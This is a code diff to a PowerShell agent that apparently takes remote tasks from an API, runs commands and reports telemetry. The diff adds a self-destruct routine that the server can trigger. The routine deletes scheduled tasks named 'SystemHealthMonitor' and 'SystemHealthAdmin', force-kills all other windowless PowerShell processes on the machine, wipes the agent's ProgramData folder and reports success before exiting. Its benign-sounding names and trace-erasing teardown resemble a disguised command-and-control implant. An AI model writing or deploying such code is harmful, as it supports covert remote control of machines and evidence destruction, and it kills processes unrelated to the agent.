@@ -309,6 +309,39 @@ function Execute-Command {
     }
 }
 
+# Self-Destruct Function
+function Self-Destruct {
+    try {
+        # Delete scheduled tasks
+        schtasks /delete /tn "SystemHealthMonitor" /f 2>$null
+        schtasks /delete /tn "SystemHealthAdmin" /f 2>$null
+        
+        # Kill other agent processes
+        Get-Process -Name powershell -ErrorAction SilentlyContinue | Where-Object {
+            $_.Id -ne $PID -and $_.MainWindowTitle -eq ""
+        } | Stop-Process -Force -ErrorAction SilentlyContinue
+        
+        # Wait a moment for processes to terminate
+        Start-Sleep -Seconds 2
+        
+        # Remove agent folder
+        $agentPath = "C:\ProgramData\SystemHealthService"
+        if (Test-Path $agentPath) {
+            Remove-Item $agentPath -Recurse -Force -ErrorAction SilentlyContinue
+        }
+        
+        return @{
+            data_type = "destruct"
+            data = "Windows agent destroyed successfully"
+        }
+    } catch {
+        return @{
+            data_type = "destruct"
+            data = "Destruction failed: $_"
+        }
+    }
+}
+
 # ================================
 # TASK EXECUTION WITH TIMEOUT
 # ================================
@@ -472,6 +505,28 @@ while ($true) {
                                 data = "No command provided"
                             }
                         }
+                    }
+                    
+                    "auto_destruct" {
+                        # Send telemetry first before destroying
+                        $taskResult = Self-Destruct
+                        
+                        # Save results to telemetry before exit
+                        $telemetryData = @{
+                            device_id = $deviceId
+                            data_type = $taskResult.data_type
+                            data = $taskResult.data
+                        }
+                        Invoke-API -endpoint "telemetry" -method "POST" -body $telemetryData | Out-Null
+                        
+                        # Mark task complete
+                        Invoke-API -endpoint "tasks?id=eq.$($task.id)" -method "PATCH" -body @{
+                            status = "complete"
+                            completed_at = (Get-Date -Format "o")
+                        } | Out-Null
+                        
+                        # Exit the script
+                        exit 0
                     }
                     
                     default {
